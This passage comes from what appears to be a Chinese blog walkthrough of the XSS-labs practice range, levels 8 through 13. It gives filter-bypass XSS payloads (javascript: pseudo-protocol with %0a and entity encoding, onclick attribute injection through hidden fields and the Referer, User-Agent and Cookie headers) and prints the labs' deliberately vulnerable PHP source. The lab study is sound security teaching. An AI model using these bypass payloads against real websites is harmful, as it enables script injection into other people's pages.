如：javas%09cript:alert()、javas%0acript:alert()、javas%0dcript:alert()。这些特殊字符在href中<code>不会破坏</code>原有的代码执行。</p><p>因为这里直接在输入框输入url编码的数据会被再次编码，所以我们在url直接提交,使用<code>%0a(换行符)</code>隔开，payload:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip%<span class="number">0</span>at:alert(<span class="string">&#x27;xss&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528234556314.png" alt="image-20200528234556314"></p><p><strong>（2）</strong>使用html实体编码绕过替换,<a href="https://tool.oschina.net/encode">在线转换</a></p><p>直接输入会被替换</p><p>转换后<strong>必须在输入框输入</strong>，不能在url中提交，否则会提交空数据。</p><p>1：未在输入框中进行，而在hackbar中进行的</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528235519079.png" alt="image-20200528235519079"></p><p>2：在输入框中进行的</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528235122074.png" alt="image-20200528235122074"></p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200528235024799.png" alt="image-20200528235024799"></p><p>最后看一下源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,$str6);      <span class="comment">//将用来起闭合作用的引号做了字符实体替换</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.htmlspecialchars($str).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="level-9——-include-detect"><a href="#level-9——-include-detect" class="headerlink" title="level 9—— include detect"></a>level 9—— include detect</h2><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529001744597.png" alt="image-20200529001744597"></p><p>​        可以看到提交的参数值插入到了标签的<code>value</code>属性值中，但是在标签的<code>href</code>属性中却并没有出现该参数值，而是显示的<code>‘您的链接不合法？有没有！’</code>这样的字符串。</p><p>一脸懵逼搞不清楚，那就<code>构造语句</code>来测试看看</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529001942204.png" alt="image-20200529001942204"></p><p>可以看到直接提交弹窗的js代码不起作用，接着看看<strong>事件触发</strong>的语句</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; onclick=javascript:alert(1) &quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529002203575.png" alt="image-20200529002203575"></p><p>虽然关键字这些是没有过滤，但是闭合的引号被编码了，而且href属性值依然没有变化。</p><p>既然这里说链接不合法那么我们就提交一个合法的链接看看效果</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.baidu.com    </span></span><br></pre></td></tr></table></figure><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529002354528.png" alt="image-20200529002354528"></p><p>​        可以看到这一次就正常了，<strong>猜测这里可能对url地址做了匹配</strong>。只有包含正常的url地址才能添加到href属性值中。既然如此，我们可以构造如下语句进行测试</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=javascript:alert(<span class="number">1</span>)http:<span class="comment">//www.baidu.com</span></span><br></pre></td></tr></table></figure><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529002550394.png" alt="image-20200529002550394"></p><p>​        可以看到语句虽然显示在了href属性值中，但是<code>javascript</code>字符被插入了<code>_</code>。那么结合之前的方法，这里用<strong>大小写绕过</strong>试试</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=javaSCript:alert(<span class="number">1</span>)http:<span class="comment">//www.baidu.com</span></span><br></pre></td></tr></table></figure><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529002712436.png" alt="image-20200529002712436"></p><p>看起来没有起作用。那么对<strong>关键字进行编码</strong>看看</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)http://www.baidu.com //unicode编码</span><br></pre></td></tr></table></figure><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529003109692.png" alt="image-20200529003109692"></p><p>但是依旧没有弹窗成功</p><p>值得注意的是此处在**alert(‘xss’)与<a href="http://www.baidu.com之间需要插入//**%EF%BC%8C%E5%90%A6%E5%88%99%E4%B8%8D%E4%BC%9A%E6%88%90%E5%8A%9F%E6%89%A7%E8%A1%8C%E5%BC%B9%E7%AA%97%E3%80%82">http://www.baidu.com之间需要插入//**，否则不会成功执行弹窗。</a></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)//http://www.baidu.com</span><br></pre></td></tr></table></figure><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529003339110.png" alt="image-20200529003339110"></p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529003405931.png" alt="image-20200529003405931"></p><p>来看看<strong>源文件代码</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;scr_ipt&quot;</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&amp;quot&#x27;</span>,$str6);</span><br><span class="line">echo <span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.htmlspecialchars($str).<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="level-10-——leak-information、改类型"><a href="#level-10-——leak-information、改类型" class="headerlink" title="level 10 ——leak_information、改类型"></a>level 10 ——leak_information、改类型</h2><p>在响应页面上只有一个显示位了，而且输入框也没有了。</p><p>而且<strong>内容完全输出</strong>了，应该是做了<strong>实体转换</strong>的，但是在看前端的地方发现了奇怪的表单</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529100608905.png" alt="image-20200529100608905"></p><p>页面上没发现在源码中居然看到还有一个隐藏的表单。其中含有<code>t_link、t_history、t_sort</code>这样三个隐藏的标签。</p><p>这样能够解释<strong>为什么后端有表格我们前端没有看见？因为它被隐藏了</strong></p><p>先不管这个，既然只有一个显示位而且参数值是插入在标签之中的，那么就用第一关的方法先测试一下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529100748156.png" alt="image-20200529100748156"></p><p>关键字符被字符编码了，这就难搞了<strong>。</strong></p><p>既然这里有三个标签的话，也就意味着是三个参数。那么看看能不能从此处下手。先看看哪一个<strong>标签</strong>能够被<strong>突破</strong>吧，构造语句如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>&amp;t_link=<span class="string">&quot; type=&quot;</span>text<span class="string">&quot;&amp;t_history=&quot;</span> type=<span class="string">&quot;text&quot;</span>&amp;t_sort=<span class="string">&quot; type=&quot;</span>text<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529101348478.png" alt="image-20200529101348478"></p><p>​        从页面响应来看，有一个标签的状态可以被改变。这个标签就是名为<code>t_sort</code>的标签，之前都是隐藏状态，但是通过构造参数响应发现只有它里面的值被改变了。因此可以从该标签进行突破，尝试能不能注入恶意代码进行弹窗。</p><p>这里构造语句如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>&amp;t_sort=<span class="string">&quot; type=&quot;</span>text<span class="string">&quot; onclick=&quot;</span>alert(<span class="string">&#x27;xss&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529102239676.png" alt="image-20200529102239676"></p><p>通过上述可知道：对keyword提交poc，根据返回的源代码，过滤了<strong>尖括号</strong>，尝试<strong>编码</strong>不能绕过，无法<strong>构造事件触发xss</strong>、无法利用<strong>属性的javascript协议</strong>、无法利用<strong>css注入</strong> </p><h3 id="或者"><a href="#或者" class="headerlink" title="或者"></a>或者</h3><p>知道 t_sort可以传递参数，但是过滤了尖括号，那我们就使用<code>javascript伪协议</code>，<strong>思路是往标签内添加属性</strong>。payload:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;t_sort=click here<span class="string">&quot; type=&quot;</span>button<span class="string">&quot; onclick=&quot;</span>javascript:alert(<span class="string">&#x27;xss&#x27;</span>)  </span><br></pre></td></tr></table></figure><p>用法是直接在<code>url</code>后面添加<code>payload</code>,提交后界面就出现了一个按钮。</p><p>最后看看<strong>源文件的代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">$str11 = $_GET[<span class="string">&quot;t_sort&quot;</span>];      <span class="comment">//1   只获取了t_sort，其他的两个没有</span></span><br><span class="line">$str22=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str11);   <span class="comment">//2</span></span><br><span class="line">$str33=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str22);   <span class="comment">//2</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars($str).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.$str33.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>要get两个参数。这可是盲猜都猜不到的，然后，似乎只过滤了尖括号的样子，因此可以随意构造，type是为了让页面展现出一个输入框，一点击就会弹出alert</p><p>服务器端在箭头1处说明是接收<code>t_sort</code>参数值的。然后在2处会删除<code>t_sort</code>参数值中的<code>&lt;、&gt;</code>。从这里来看的话这一关就只能是将js代码插入到<strong>标签的属性值</strong>中来执行而不能通过<strong>闭合标签</strong>引入新的标签来触发XSS了</p><h2 id="level-11-referer"><a href="#level-11-referer" class="headerlink" title="level 11 referer"></a>level 11 referer</h2><p>页面上也是只有一个显示位，那么看看网页源码</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529111703637.png" alt="image-20200529111703637"></p><p>可以看到如同第十关一样有隐藏的表单，不同的是多了一个名为<code>t_ref</code>的标签。这里先不管它。尝试用上一关的方法看看能不能从这几个标签进行突破注入代码。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=good job!&amp;t_link=<span class="string">&quot;type=&quot;</span>text&amp;t_history=<span class="string">&quot;type=&quot;</span>text&amp;t_sort=<span class="string">&quot;type=&quot;</span>text&amp;t_ref=<span class="string">&quot;type=&quot;</span>text</span><br></pre></td></tr></table></figure><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529112424595.png" alt="image-20200529112424595"></p><p>原来t_sort仍然是接受参数值的，但是里面的双引号被编码了，这样浏览器只能正常显示字符但是却无法起到闭合的作用了。</p><p>这里实在想不出有什么绕过的方法，所以查看源文件代码看看是怎么回事</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line">$str22=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars($str).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars($str00).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.$str33.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$str11=$_SERVER[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br></pre></td></tr></table></figure><p>这句代码可以获取<code>http</code>请求头中的<code>Referer</code>字段，就是我们<strong>上一级网页的url</strong>，只过滤了尖括号，使用<code>javascript伪协议</code>可以绕过</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529113129253.png" alt="image-20200529113129253"></p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529113055042.png" alt="image-20200529113055042"></p><p>​        原来在服务器端还将请求头中的<code>referer</code>头的值赋给了str11这个变量，在将变量值中的<code>&lt;、&gt;</code>删除之后就会插入到<code>t_ref</code>这个标签的<code>value</code>属性值中。而上一关的<code>t_sort</code>标签虽然也能接收并显示参数值，但是这个参数值是要用<code>htmlspecialchars</code>()函数处理的。</p><p>既然了解了服务器端的操作，这里抓取数据包看看</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529113753257.png" alt="image-20200529113753257"></p><p>可以看到在原始的请求数据包中并没有referer这个请求头，那么我们可以自己给它加上</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529113743418.png" alt="image-20200529113743418"></p><p>可以看到我们添加的referer头的值出现在了t_ref标签的value属性值中了。接下来就是从这里突破注入恶意代码了，如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">referer: &quot; type&#x3D;&quot;text&quot; onclick&#x3D;&quot;alert(1)</span><br></pre></td></tr></table></figure><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529114338785.png" alt="image-20200529114338785"></p><p>恶意代码成功插入了value属性值中，接着将这个请求的响应放行到浏览器试试</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529114628203.png" alt="image-20200529114628203"></p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529114644039.png" alt="image-20200529114644039"></p><p>成功弹窗了，说明<strong>通过referer头来提交恶意代码触发了XSS。</strong></p><p>这也从<strong>侧面反映了测试XSS漏洞不仅仅需要关注网页源码里面的东西，抓取数据包测试一下有时候也有意外之喜。</strong></p><h3 id="或者-1"><a href="#或者-1" class="headerlink" title="或者"></a>或者</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">click here <span class="string">&quot; type=&quot;</span>button<span class="string">&quot; onclick=javascript:alert(1)</span></span><br></pre></td></tr></table></figure><p>可参考：<code>https://www.cnblogs.com/xiaomeng2333/p/11595786.html</code></p><h2 id="level-12-——User-Agent"><a href="#level-12-——User-Agent" class="headerlink" title="level 12 ——User-Agent"></a>level 12 ——User-Agent</h2><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529120455971.png" alt="image-20200529120455971"></p><p>看到了t_ua这样一个标签，并且其中的value属性的值怎么看起来那么像抓取数据包中<code>User-Agent</code>头的值呐？莫非服务器端是获取了请求中<code>User-Agent</code>头的值然后插入到这里的吗？联想到上一关的知识，我决定尝试一下先抓包看看</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529125121566.png" alt="image-20200529125121566"></p><p>果然两个值是一模一样的。那么接下来尝试先<code>闭合</code>前面的value属性然后构造恶意代码看看</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; type=&quot;</span>text<span class="string">&quot;  onclick=&quot;</span>alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529125432766.png" alt="image-20200529125432766"></p><p>貌似是成功了，放行响应数据包到浏览器看看</p><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529125941080.png" alt="image-20200529125941080"></p><p>以看到也是成功弹窗了。最后让我们看看源文件的代码吧。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">$str22=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars($str).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars($str00).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.$str33.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="level-13-——cookie"><a href="#level-13-——cookie" class="headerlink" title="level 13 ——cookie"></a>level 13 ——cookie</h2><p><img src="/2020/07/14/XSS%E7%BB%BC%E5%90%88%E5%AD%A6%E4%B9%A0/image-20200529131202620.png" alt="image-20200529131202620"></p><p>这次又出现了一个新的标签，按照这个靶场一贯的作风我猜这里应该还是跟http请求头有关。前两关t_后面的字符都与http请求头的名称有联系，这里出现一个cook的话猜测与cookie有关。先抓包测试一下</p><p>具体的和12是一样 的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">setcookie(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;call me maybe?&quot;</span>, time()+<span class="number">3600</span>);</span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line">$str11=$_COOKIE[<span class="string">&quot;user&quot;</span>];</span><br><span class="line">$str22=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars($str).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars($str00).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;</span>.$str33.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span 